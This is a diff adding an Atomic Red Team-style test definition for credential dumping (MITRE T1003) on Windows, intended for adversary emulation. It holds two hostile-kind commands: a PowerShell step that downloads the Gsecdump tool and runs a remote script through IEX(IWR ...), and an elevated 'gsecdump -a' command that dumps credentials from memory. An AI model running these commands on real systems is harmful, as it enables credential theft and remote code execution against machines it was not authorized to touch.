@@ -1,0 +1,39 @@
+attack_technique: T1003
+display_name: OS Credential Dumping
+atomic_tests:
+- name: Gsecdump
+  description: |
+    Dump credentials from memory using Gsecdump.
+  supported_platforms:
+  - windows
+  input_arguments:
+    gsecdump_exe:
+      description: Path to the Gsecdump executable
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe
+    gsecdump_bin_hash:
+      description: File hash of the Gsecdump binary file
+      type: string
+      default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
+    gsecdump_url:
+      description: Path to download Gsecdump binary file
+      type: url
+      default: https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Gsecdump must exist on disk at specified location (#{gsecdump_exe})
+    prereq_command: |
+      if (Test-Path "#{gsecdump_exe}") {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"
+      IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
+      if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){
+        Move-Item $binpath "#{gsecdump_exe}"
+      }
+  executor:
+    command: |
+      "#{gsecdump_exe}" -a
+    name: command_prompt
+    elevation_required: true
